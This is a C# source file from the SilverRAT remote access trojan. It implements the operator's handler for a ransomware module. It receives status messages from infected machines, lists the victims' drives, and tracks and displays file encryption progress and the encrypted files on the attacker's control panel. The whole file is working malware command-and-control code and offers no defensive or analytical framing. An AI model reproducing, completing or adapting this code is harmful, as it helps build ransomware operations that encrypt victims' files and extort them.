using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

public class HandleRansomware
{
    public static object Synclock = new object();

    public async void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "CompleteEncrypt":
                    {
                        Ransomware Rnsom2 = (Ransomware)Application.OpenForms["Ransom:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (Rnsom2 != null)
                        {
                            Rnsom2.Encrypt.Enabled = true;
                            Rnsom2.progressBar1.Value = 0;
                            Rnsom2.State.Text = "Complete " + 0;
                            Rnsom2.LogsPath.Text = "The files have been encrypted successfully | Size : " + Methods.BytesToString(long.Parse(unpack_msgpack.ForcePathObject("Size").AsString));
                            Rnsom2.LogsPath.ForeColor = Color.LimeGreen;
                            MessageBox.Show("done");
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "ListEncrpt":
                    {
                        Ransomware Rnsom = (Ransomware)Application.OpenForms["Ransom:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (Rnsom != null)
                        {
                            await Task.Run(delegate
                            {
                                lock (Rnsom.syncPicbox)
                                {
                                    if (bool.Parse(unpack_msgpack.ForcePathObject("IsComplete").AsString))
                                    {
                                        int value = int.Parse(unpack_msgpack.ForcePathObject("State").AsString);
                                        string asString = unpack_msgpack.ForcePathObject("Date").AsString;
                                        string text = Methods.BytesToString(long.Parse(unpack_msgpack.ForcePathObject("Size").AsString));
                                        string asString2 = unpack_msgpack.ForcePathObject("File").AsString;
                                        ListViewItem value2 = new ListViewItem
                                        {
                                            Text = "Encrypted",
                                            ToolTipText = asString2,
                                            SubItems = { asString, text, asString2 },
                                            ForeColor = Color.LimeGreen,
                                            ImageIndex = 0
                                        };
                                        Rnsom.ListEncryptd.Items.Add(value2);
                                        Rnsom.progressBar1.Value = value;
                                        Rnsom.State.Text = "Complete " + value + "%";
                                        Rnsom.LogsPath.Text = asString2;
                                    }
                                    else
                                    {
                                        Rnsom.Encrypt.Enabled = true;
                                        Rnsom.progressBar1.Value = 100;
                                        Rnsom.State.Text = "Complete " + 100;
                                        Rnsom.progressBar1.Value = 0;
                                        Rnsom.State.Text = "Complete " + 0;
                                        Rnsom.LogsPath.Text = "The files have been encrypted successfully | Size : " + Methods.BytesToString(long.Parse(unpack_msgpack.ForcePathObject("ValueSize").AsString));
                                        Rnsom.LogsPath.ForeColor = Color.LimeGreen;
                                    }
                                }
                            });
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        Ransomware Rnsom3 = (Ransomware)Application.OpenForms["Ransom:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (Rnsom3 != null)
                        {
                            if (Rnsom3.Client != null)
                            {
                                break;
                            }
                            Rnsom3.Client = client;
                            Rnsom3.LoaderConnect.Visible = false;
                            Rnsom3.Timer1.Start();
                            Rnsom3.TimerCounFile.Start();
                            try
                            {
                                Rnsom3.GetDriversComboBox.Items.Clear();
                                string ReadList = unpack_msgpack.ForcePathObject("GetDrivers").AsString;
                                string[] NextArrary = ReadList.Split(new string[1] { "!*" }, StringSplitOptions.None);
                                string[] array = NextArrary;
                                foreach (string Driver in array)
                                {
                                    if (Driver.Length > 0 && Driver != "C:\\")
                                    {
                                        Rnsom3.GetDriversComboBox.Items.Add(Driver);
                                    }
                                }
                                if (Rnsom3.GetDriversComboBox.Items.Count > 0)
                                {
                                    Rnsom3.GetDriversComboBox.SelectedIndex = 0;
                                }
                            }
                            catch
                            {
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
